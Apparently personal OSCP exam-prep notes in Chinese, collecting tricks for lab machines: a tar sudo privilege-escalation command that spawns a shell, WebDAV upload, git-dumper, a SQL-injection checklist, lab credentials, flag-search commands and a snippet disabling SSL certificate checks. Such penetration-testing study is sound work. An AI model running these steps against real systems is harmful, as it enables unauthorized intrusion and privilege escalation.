>[!章節重點]
>本章為靶機實務，紀錄有OSCP教材、HTB、Tryhackme等等靶場**遇的坑、玩的梗及耍的賤招**。
# libc.so 版本問題
>[!warning ]
>libc.so版本會導致C語言編譯後無法執行，可以利用靜態連結是指將所有需要的函式庫程式碼都編譯到可執行檔中，因此可執行檔在執行時就不需要額外的動態函式庫。
- 錯誤訊息如下
```
/tmp/rootshell: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/rootshell)
```
- 指令
```
gcc -static -o test_121 test_121.c
```
# 網路上的OSCP的求生指南
>[!warning ] 小節重點
>筆記能力有限，蒐集網路上的有用資源，作為考試時的保命符

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- [hacktricks](https://book.hacktricks.xyz/)
- [LOLBAS](https://lolbas-project.github.io/)
- [Sharp系列binary的吉哈伯](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [Hacking Windows 备忘录 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6498?time__1311=n4%2BxnD0DRDB7eAK0QbDsA3xCq4S73Kb3D9AoD&alichlgref=https%3A%2F%2Fwww.google.com.tw%2F)
- [GitHub - xsudoxx/OSCP](https://github.com/xsudoxx/OSCP)
- [GitHub - 0xsyr0/OSCP: OSCP Cheat Sheet](https://github.com/0xsyr0/oscp)
- [windows-kernel-exploits Windows平台提权漏洞集合](https://github.com/SecWiki/windows-kernel-exploits)
- [SharpCollection](https://github.com/Flangvik/SharpCollection)
- [备考 OSCP 的各种干货资料/渗透测试干货资料](https://github.com/isecurityplus/OSCP)
# 靶機的各種賤招及經驗的紀錄
>[!重點]
>陷阱跳進去一次就好，不需要跳第二次
- PowerShell 執行exe檔時，要用`.\filename.exe`執行比較好。
- Cmd在執行exe檔時，直接打檔名`filename.exe`就可以了。
## IIS有開Webdav
>[!重點]
>可以利用cadaver嘗試做檔案上傳，HTTP Method測試
```
cadaver http://192.168.241.122
Authentication required for 192.168.241.122 on server `192.168.241.122':
Username: fmcsorley
Password: 
dav:/> put test.html 
Uploading test.html to `/test.html':
Progress: [=============================>] 100.0% of 19 bytes succeeded.
```
## 上傳public key到靶機
https://mqt.gitbook.io/oscp-notes/ssh-keys?source=post_page-----9c7f5b963559--------------------------------
## 當出現奇怪的binary、exe的時候
>[!warning ] 小節重點
>記得要逆向看看

- 可能藏著密碼
- 可能要觀察封包
- 要在kali安裝執行環境(wine64、mono)
## sudo 出現非root的NOPASSWOR
>[!warning] 小節重點
記得要用`sudo -u onuma  `
- sudo -l
``` bash
www-data@TartarSauce:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```
- 要提權時，記得要加入`sudo -u onuma`
``` bash
sudo -u onuma  /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

## 當出現git的時候
>[!danger  ] 重點提醒
>除了提權之外，可以想想有沒有具有需要版本控制的程式(例如wordpress)，查看git的紀錄可能會有收穫。
- git列舉指令
```
git status
git log
```
- git查看修改紀錄指令
```
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
```
- .git是一個資料夾，要進去看config檔案
### git_dumper
>[!warning ]
>透過前期列舉，可以發現有.git可以利用
```
/opt/git-dumper/git_dumper.py http://192.168.224.144/.git/ /home/kali/Desktop/OSCP_A/git
```
## 當利用某個服務進去後
>如果那個服務需要登入帳號密碼，請不要忘記在系統內找到密碼並登入看看，如果有兩個服務，請務必試試看找第二個密碼並登入看看。
## 當出現Login Form的時候
>[!danger  ] 重點提醒
>可能性有很多，包含弱密碼、SQL Injection、兔子坑等等手段。
### SQL Injection流程如下
1. 判斷SQL種類
2. 判斷SQL Injection的位置
	1. 丟`'`進去看看有沒有噴錯誤，有的話87%有SQL Injection。
	2. 網址也有可能有SQL Injection。
	3. 直接Google 軟體名稱，可能就會有POC跑出來。
3. 用Time Base SQL Injection測試
	1. 多利用PayloadAllTheThing裡面的東西丟
4. 判斷是RCE還是Data Leak
# 密碼管理相關
> 密碼列舉的聯想筆記
> OSCP教的方法，建立cred.txt  
```
daniela:tequieromucho (SSH private key passphrase)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (fetch_current.sh)

Other identified users:
marcus
```
# 搜尋flag.txt指令
- PowerShell
``` powershell
Get-ChildItem -Path C:\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue
```
# 跑不出whoami可以嘗試
```
set PATH=%SystemRoot%\system32;%SystemRoot%;
```
# 截圖限制
- Linux
``` cmd
hostname && whoami && ip addr && cat Proof.txt
```
- Windows 
``` cmd
hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\proof.txt
```
# 某些 python poc是以 urllib 發出 https 請求。在遇到自簽憑證時，會發生憑證檢查錯誤。解決的方法是在 python code 加入下方註解掉的二行即可。各位可以用下方的程式碼測試。
``` python
import urllib.request 
#import ssl 
#ssl._create_default_https_context = ssl._create_unverified_context 
with urllib.request.urlopen('https://self-signed.badssl.com/') as response:
   print(response.info())
```

# 把網頁轉成字典檔的工具，遇到需要破解密碼，可是 rockyou 卻解不開時可以試試
``` 
cewl -d 2 -m 5 -w docswords.txt https://example.com
```
```
cewl http://192.168.233.61:8081/ | grep -v CeWL > custom-wordlist.txt
cewl --lowercase http://192.168.233.61:8081/ | grep -v CeWL  >> custom-wordlist.txt
```
# SSH連線錯誤
>Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

>錯誤成因:
8.8p1 版的 openssh 的 ssh 客戶端默認禁用了 ssh-rsa 算法, 但是對方服務器只支持 ssh-rsa, 當你不能自己升級遠程服務器的 openssh 版本或修改配置讓它使用更安全的算法時, 在本地 ssh 針對這些舊的ssh server重新啟用 ssh-rsa 也是一種權宜之法.

``` 
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss,ssh-rsa root@192.168.2.1
```


https://github.com/Pennyw0rth/NetExec
https://pypi.org/project/uploadserver/